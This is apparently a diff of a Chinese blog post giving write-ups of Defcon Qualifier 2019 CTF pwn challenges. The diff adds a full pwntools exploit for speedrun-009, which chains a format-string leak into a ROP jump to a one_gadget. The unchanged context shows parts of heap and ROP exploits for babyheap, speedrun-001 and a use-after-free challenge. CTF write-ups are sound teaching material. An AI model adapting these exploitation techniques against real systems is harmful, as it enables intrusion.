@@ -6,23 +6,24 @@
   <meta name="keywords" content=" Pwn , CTF , Defcon ">
   <meta name="description" content="Defcon2019Q | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="看看 CVE 漏洞长什么样？ 不定期更新吧。 CVE-2019-1010305https:&#x2F;&#x2F;github.com&#x2F;kyz&#x2F;libmspack&#x2F;issues&#x2F;27 这个洞应该是Fuzz出来的。 堆溢出。 CVE-2019-1010223从cvedetails可知存在漏洞的版本 。 下载源码 0.4.8 版本。 aubio_tempo_t * new_aubio_tempo (const char_">
+<meta name="description" content="[toc] Defcon Qual 2019Defcon CTF 2020 5月就开赛了，复盘了一些去年的题目。  speedrun-009 保护全开   格式化字符串漏洞、栈溢出 攻击思路   fmt 泄露栈上内容，得到libc一些符号地址，one_gadget也就有了  fmt 泄露canary  ROP 到one_gadget  Pwned!#!&#x2F;usr&#x2F;bin&#x2F;env python #co">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVEs">
-<meta property="og:url" content="https://primelyw.github.io/2020/04/05/CVEs/index.html">
+<meta property="og:title" content="Defcon2019Q">
+<meta property="og:url" content="https://primelyw.github.io/2020/04/02/Defcon2019Q/index.html">
 <meta property="og:site_name" content="风云阁">
-<meta property="og:description" content="看看 CVE 漏洞长什么样？ 不定期更新吧。 CVE-2019-1010305https:&#x2F;&#x2F;github.com&#x2F;kyz&#x2F;libmspack&#x2F;issues&#x2F;27 这个洞应该是Fuzz出来的。 堆溢出。 CVE-2019-1010223从cvedetails可知存在漏洞的版本 。 下载源码 0.4.8 版本。 aubio_tempo_t * new_aubio_tempo (const char_">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/05/CVEs/image-20200405110907306.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/05/CVEs/image-20200405110328221.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/05/CVEs/image-20200405122005539.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/05/CVEs/image-20200405124037117.png">
-<meta property="article:published_time" content="2020-04-05T12:45:40.000Z">
-<meta property="article:modified_time" content="2020-04-05T13:40:16.420Z">
+<meta property="og:description" content="[toc] Defcon Qual 2019Defcon CTF 2020 5月就开赛了，复盘了一些去年的题目。  speedrun-009 保护全开   格式化字符串漏洞、栈溢出 攻击思路   fmt 泄露栈上内容，得到libc一些符号地址，one_gadget也就有了  fmt 泄露canary  ROP 到one_gadget  Pwned!#!&#x2F;usr&#x2F;bin&#x2F;env python #co">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/02/Defcon2019Q/image-20200409133508781.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/02/Defcon2019Q/image-20200409133959847.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/02/Defcon2019Q/image-20200409133712725.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/02/Defcon2019Q/image-20200409133700701.png">
+<meta property="article:published_time" content="2020-04-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-04-09T05:42:09.872Z">
 <meta property="article:author" content="枫云李">
-<meta property="article:tag" content="CVE">
 <meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Defcon">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://primelyw.github.io/2020/04/05/CVEs/image-20200405110907306.png">
+<meta name="twitter:image" content="https://primelyw.github.io/2020/04/02/Defcon2019Q/image-20200409133508781.png">
 
 
 <link rel="icon" href="/img/avatar2.jpg">
@@ -316,7 +317,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-04-02 00:58:27'>2020-04-02 00:00</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-09 13:42:09'>2020-04-02 00:00</time>
         
     </div>
     <div class="article-meta">
@@ -338,7 +339,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Defcon-Qual-2019"><span class="toc-text">Defcon Qual 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap"><span class="toc-text">babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwning"><span class="toc-text">Pwning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned"><span class="toc-text">Pwned!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-1"><span class="toc-text">speedrun-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing-1"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwning-1"><span class="toc-text">Pwning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned-1"><span class="toc-text">Pwned!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-02"><span class="toc-text">speedrun-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-07"><span class="toc-text">speedrun-07</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing-2"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwning-2"><span class="toc-text">Pwning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned！"><span class="toc-text">Pwned！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-10"><span class="toc-text">speedrun-10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing-3"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned-2"><span class="toc-text">Pwned!</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Defcon-Qual-2019"><span class="toc-text">Defcon Qual 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-009"><span class="toc-text">speedrun-009</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned"><span class="toc-text">Pwned!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap"><span class="toc-text">babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwning"><span class="toc-text">Pwning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned-1"><span class="toc-text">Pwned!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-1"><span class="toc-text">speedrun-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing-1"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwning-1"><span class="toc-text">Pwning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned-2"><span class="toc-text">Pwned!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-02"><span class="toc-text">speedrun-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-07"><span class="toc-text">speedrun-07</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing-2"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwning-2"><span class="toc-text">Pwning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned！"><span class="toc-text">Pwned！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-10"><span class="toc-text">speedrun-10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing-3"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned-3"><span class="toc-text">Pwned!</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -354,7 +355,69 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Defcon-Qual-2019"><a href="#Defcon-Qual-2019" class="headerlink" title="Defcon Qual 2019"></a>Defcon Qual 2019</h1><p>Defcon CTF 2020 5月就开赛了，复盘了一些去年的题目。</p>
+        <p>[toc]</p>
+<h1 id="Defcon-Qual-2019"><a href="#Defcon-Qual-2019" class="headerlink" title="Defcon Qual 2019"></a>Defcon Qual 2019</h1><p>Defcon CTF 2020 5月就开赛了，复盘了一些去年的题目。</p>
+<p><img src="/2020/04/02/Defcon2019Q/image-20200409133508781.png" alt="image-20200409133508781"></p>
+<h2 id="speedrun-009"><a href="#speedrun-009" class="headerlink" title="speedrun-009"></a>speedrun-009</h2><p><img src="/2020/04/02/Defcon2019Q/image-20200409133959847.png" alt="程序保护检查"></p>
+<p>保护全开</p>
+<p><img src="/2020/04/02/Defcon2019Q/image-20200409133712725.png" alt="变量栈分布"></p>
+<p><img src="/2020/04/02/Defcon2019Q/image-20200409133700701.png" alt="漏洞点"></p>
+<p>格式化字符串漏洞、栈溢出</p>
+<p>攻击思路</p>
+<ul>
+<li><input checked disabled type="checkbox"> fmt 泄露栈上内容，得到libc一些符号地址，<code>one_gadget</code>也就有了</li>
+<li><input checked disabled type="checkbox"> fmt 泄露<code>canary</code></li>
+<li><input checked disabled type="checkbox"> ROP 到<code>one_gadget</code></li>
+</ul>
+<h3 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned!"></a>Pwned!</h3><pre><code class="python">#!/usr/bin/env python
+#coding=utf8
+from pwn import * 
+import primedbg 
+import sys 
+context.arch=&#39;amd64&#39;
+io=process(&#39;./speedrun-009&#39;)
+if len(sys.argv)==2 and sys.argv[1]==&#39;dbg&#39;:
+    primedbg.p_attach_dbg(io,[0x00000A3B])
+#print(io.libs()[io.libc])
+#print(hex(io.libc.address))
+def cmd(idx):
+    io.sendafter(&#39; or 3\n&#39;,str(idx))
+
+def r_v5(c):
+    cmd(1)
+    # max 0x5dc 
+    # v5[0x408]
+    sleep(0.01)
+    io.send(c)
+
+def r_s(c):
+    cmd(2)
+    # max read 0xc8
+    # s[0xc7]
+    sleep(0.01)
+    io.send(c)
+
+def leak(offset):
+    payload=&#39;a&#39;*8+&#39;.%&#39;+str(offset)+&#39;$pb*8&#39;
+    r_s(payload)
+    io.recvuntil(&#39;a&#39;*8+&#39;.&#39;)
+    return io.recvuntil(&#39;b*8&#39;,True)
+
+if __name__==&#39;__main__&#39;:
+    r_v5(&#39;hello&#39;)
+    canary=int(leak(163),16)
+    libc_base=int(leak(27),16)-6396400
+    print(hex(libc_base))
+    one=libc_base+0x4f2c5
+    success(hex(one))
+    v5=&#39;a&#39;*0x408+p64(canary)+&#39;b&#39;*8+p64(one)
+    r_v5(v5)
+    #raw_input()
+    cmd(3)
+    io.send(&#39;cat flag\n&#39;)
+    io.interactive()
+
+</code></pre>
 <h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><pre><code>primelee@vmware Desktop/CTF/now % strings libc.so| grep &#39;release version&#39;                                                                                  22:16:19
 GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29.</code></pre><p>libc.so 版本 2.29</p>
 <pre><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
@@ -381,7 +444,7 @@ Command:
 <li>填满 tcache list ， free chunk X 到 unsorted bin，再free下一个chunk 调用 unlink，合并到 top chunk ，malloc 7次清空tcache list，malloc 泄露 unsorted bin 地址得到 libc 基地址</li>
 <li>一个字节溢出改下一个 chunk B 的 size ，再次 malloc chunk B 可以覆盖下一个 chunk C ， 此时 chunk C 在 tcache list ，fd 被篡改为 free_hook ，malloc 两次写 one gadget 入 free_hook。</li>
 </ol>
-<h3 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned!"></a>Pwned!</h3><pre><code class="python">#! /usr/bin/env python
+<h3 id="Pwned-1"><a href="#Pwned-1" class="headerlink" title="Pwned!"></a>Pwned!</h3><pre><code class="python">#! /usr/bin/env python
 from pwn import * 
 import sys
 
@@ -504,7 +567,7 @@ GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0</code></pre><p>这样ubuntu版本就�
   return sub_40F710((__int64)&quot;This will be the last thing that you say: %s\n&quot;, &amp;buf);
 }</code></pre><p>简单栈溢出</p>
 <h3 id="Pwning-1"><a href="#Pwning-1" class="headerlink" title="Pwning"></a>Pwning</h3><pre><code>primelee@vmware Desktop/CTF/now % ROPgadget --binary speedrun-001 --ropchain --silent&gt; ropchain</code></pre><p>ROPgadget 生成 system(“/bin/sh”) 的 ropchain 。</p>
-<h3 id="Pwned-1"><a href="#Pwned-1" class="headerlink" title="Pwned!"></a>Pwned!</h3><pre><code>#!/usr/bin/env python2
+<h3 id="Pwned-2"><a href="#Pwned-2" class="headerlink" title="Pwned!"></a>Pwned!</h3><pre><code>#!/usr/bin/env python2
 # execve generated by ROPgadget
 
 from pwn import *  
@@ -819,7 +882,7 @@ Choose something.
           return __readfsqword(0x28u) ^ v8;
         free(msg_list[v3-- - 1]);
         break;</code></pre><p>漏洞在于释放堆，为置零，通过UAF可以泄露puts@got内容。name_chunk 和 msg_chunk 重叠，更改name_chunk 处的puts为system实现弹shell。</p>
-<h3 id="Pwned-2"><a href="#Pwned-2" class="headerlink" title="Pwned!"></a>Pwned!</h3><pre><code>#! /bin/env python
+<h3 id="Pwned-3"><a href="#Pwned-3" class="headerlink" title="Pwned!"></a>Pwned!</h3><pre><code>#! /bin/env python
 #coding=utf8
 #============
 # name_chunk [0,48]
@@ -897,7 +960,7 @@ io.interactive()</code></pre>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
     <p><span class="copy-title">发布时间:</span>2020-04-02, 00:00:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-04-02, 00:58:27</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-09, 13:42:09</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/02/Defcon2019Q/" title="Defcon2019Q">https://primelyw.github.io/2020/04/02/Defcon2019Q/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
